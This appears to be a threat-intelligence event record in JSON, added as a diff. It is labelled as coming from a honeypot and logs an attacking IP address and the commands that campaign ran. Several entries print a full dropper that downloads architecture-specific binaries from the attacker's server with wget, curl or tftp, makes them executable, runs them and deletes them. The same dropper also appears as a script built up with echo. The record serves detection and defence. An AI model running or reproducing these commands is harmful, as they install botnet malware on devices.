@@ -1,0 +1,135 @@
+{
+  "Event": {
+    "uuid": "001e6be1-f09e-5d93-bfd3-eb0e93ab959a",
+    "info": "Sundew honeypot - campaign bb347844e915 (1 sources) - cd /tmp||cd /var/run||cd /mnt||cd /root||cd /;for a in mips ",
+    "date": "2026-09-24",
+    "analysis": "2",
+    "threat_level_id": "3",
+    "published": true,
+    "Orgc": {
+      "name": "Sundew honeypot",
+      "uuid": "3d06790b-d81d-56fb-9e82-4e5ee6b6de3c"
+    },
+    "Tag": [
+      {
+        "name": "type:OSINT"
+      },
+      {
+        "name": "tlp:clear"
+      },
+      {
+        "name": "sundew:class=\"attack\""
+      }
+    ],
+    "Attribute": [
+      {
+        "uuid": "44626e77-52ec-5c1d-a580-044e492d6a8b",
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "value": "217.60.103.135",
+        "timestamp": "1790233220",
+        "comment": "delivered_payload, confidence high; 3 sessions, 15 commands, 3 downloads; first_seen 2026-09-23T23:26:20.509397Z, last_seen 2026-09-23T23:29:54.788231Z; expires 7d after last_seen"
+      },
+      {
+        "uuid": "81ecab36-fd30-553e-8a85-8de5f40e0a93",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "cd /tmp||cd /var/run||cd /mnt||cd /root||cd /;for a in mips mpsl arm4 arm5 arm6 arm7 x86_64 x86;do wget -q http://217.60.103.135/$a -O .b||curl -s http://217.60.103.135/$a -o .b||tftp -g -l .b -r $a 217.60.103.135||tftp -g -l $a 217.60.103.135;chmod +x .b && ./.b && break || chmod +x $a && ./$a && break;done;rm -f .b $a",
+        "timestamp": "1790233220",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "e09898ae-dc7b-567f-9a1b-1bdbba074941",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "echo '#!/bin/sh' > .s",
+        "timestamp": "1790233220",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "afc0cf96-c05e-5323-b806-e1ba4c6ff14d",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "echo 'cd /tmp||cd /var/run||cd /mnt||cd /root||cd /' >> .s",
+        "timestamp": "1790233220",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "9a363b7e-6847-5925-b4cd-71b351db1576",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "echo 'for a in mips mpsl arm4 arm5 arm6 arm7 x86_64 x86; do' >> .s",
+        "timestamp": "1790233220",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "5fe41dd8-dce5-5441-806d-556a735c093e",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "echo 'wget -q http://217.60.103.135/$a -O .c||curl -s http://217.60.103.135/$a -o .c||tftp -g -l .c -r $a 217.60.103.135||tftp -g -l $a 217.60.103.135' >> .s",
+        "timestamp": "1790233220",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "966e5aac-600c-5572-ba43-c61304743f0a",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "echo 'chmod +x .c && ./.c && break || chmod +x $a && ./$a && break' >> .s",
+        "timestamp": "1790233220",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "3eb25c72-2998-5744-b2e1-929d4e720ea0",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "echo 'done' >> .s",
+        "timestamp": "1790233220",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "958d7035-6595-5c12-9e40-6891f2112e02",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "echo 'rm -f .c $a' >> .s",
+        "timestamp": "1790233220",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "d76c7ea1-dd91-5659-90d1-1e472fe8bc0b",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "sh .s; rm -f .s",
+        "timestamp": "1790233220",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "5579a935-c356-5621-9ba1-72e7b8568583",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "#!/bin/sh\ncd /tmp||cd /var/run||cd /mnt||cd /root||cd /\nfor a in mips mpsl arm4 arm5 arm6 arm7 x86_64 x86; do\nwget -q http://217.60.103.135/$a -O .c||curl -s http://217.60.103.135/$a -o .c||tftp -g -l .c -r $a 217.60.103.135||tftp -g -l $a 217.60.103.135\nchmod +x .c && ./.c && break || chmod +x $a && ./$a && break\ndone\nrm -f .c $a\n",
+        "timestamp": "1790233220",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "45d7f1ad-db60-5c76-b204-2ab1728173a2",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "exit",
+        "timestamp": "1790233220",
+        "comment": "command run by this campaign"
+      }
+    ]
+  }
+}
